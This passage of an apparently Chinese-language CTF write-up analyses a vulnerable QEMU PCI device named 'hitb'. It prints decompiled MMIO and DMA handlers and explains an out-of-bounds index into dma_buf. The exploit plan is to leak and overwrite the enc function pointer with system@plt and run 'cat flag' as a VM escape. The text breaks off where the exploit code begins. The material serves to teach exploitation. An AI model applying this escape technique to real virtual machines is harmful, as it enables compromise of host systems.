 qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到在<code>timer_init_tl</code>函数是将<code>hitb_dma_timer</code>作为回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">timer_init_tl</span><span class="params">(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, <span class="keyword">int</span> scale, QEMUTimerCB *cb, <span class="keyword">void</span> *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ts-&gt;timer_list = timer_list;</span><br><span class="line">  ts-&gt;cb = cb;</span><br><span class="line">  ts-&gt;opaque = opaque;</span><br><span class="line">  ts-&gt;scale = scale;</span><br><span class="line">  ts-&gt;expire_time = <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在下面注册了<code>hitb_mmio_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">40</span> <span class="number">44</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A0 <span class="number">41</span>+hitb_mmio_ops dq offset hitb_mmio_read                ; read</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; DATA XREF: pci_hitb_realize+<span class="number">99</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset hitb_mmio_write               ; write</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以这里需要重点注意的也就是这样三个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hitb_mmio_read</span><br><span class="line">hitb_mmio_write</span><br><span class="line">hitb_dma_timer</span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><p>在分析函数之前还需要搞懂设备结构体，具体可以在view-&gt;Open Subviews-&gt;Local Type(shift + F1)中搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="keyword">bool</span> stopping;</span><br><span class="line">  <span class="keyword">uint32_t</span> addr4;</span><br><span class="line">  <span class="keyword">uint32_t</span> fact;</span><br><span class="line">  <span class="keyword">uint32_t</span> status;</span><br><span class="line">  <span class="keyword">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="keyword">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">void</span> (*enc)(<span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">uint64_t</span> dma_mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> src;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> dst;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0x10000ED</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>size == 4</code>才能读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) == <span class="number">0</span> || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">136</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (val &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; (opaque-&gt;status &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样需要满足<code>size == 4</code>，并且在部分操作还需要满足<code>(opaque-&gt;dma.cmd &amp; 1) == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )                     <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 3</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是回调函数了，在上面的<code>hitb_mmio_write</code>函数中，当满足<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>就会调用了。而在这个函数中存在这样一个函数<code>cpu_physical_memory_rw</code>，这个函数在我翻看手册的时候还发现了其他类似的函数<code>cpu_physical_memory_read</code>、<code>cpu_physical_memory_write</code>所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。<code>cpu_physical_memory_rw</code>函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。</p><ol><li> dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中</li><li> dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中</li><li> dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]</li></ol><p>这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。</p><p>即首先通过访问mmio地址与值（addr与value），在<code>hitb_mmio_write</code>函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用<code>hitb_dma_timer</code>，该函数根据<code>dma.cmd</code>的不同调用<code>cpu_physical_memory_rw</code>函数将数据从物理地址拷贝到<code>dma_buf</code>中或从<code>dma_buf</code>拷贝到物理地址中。</p><h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>接下来就是分析程序的漏洞了，这里的漏洞是非常明显的位于<code>hitb_dma_timer</code>函数中，其中的v2是没有做任何边界检查的，存在明显的溢出漏洞。</p><p>并且在上述找到的结构体看到了，他的<code>dma_buf</code>的大小只有4096，并且下方紧接着就是enc。而我们都知道enc存放的是回调函数，所以这里的利用思路就是，通过溢出泄漏出enc中存放的函数地址，紧接着修改其中的函数为<code>system@plt</code>，最后在<code>dma_buf</code>中写入<code>cat flag\x00</code>即可获取flag。</p><p><strong>exp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 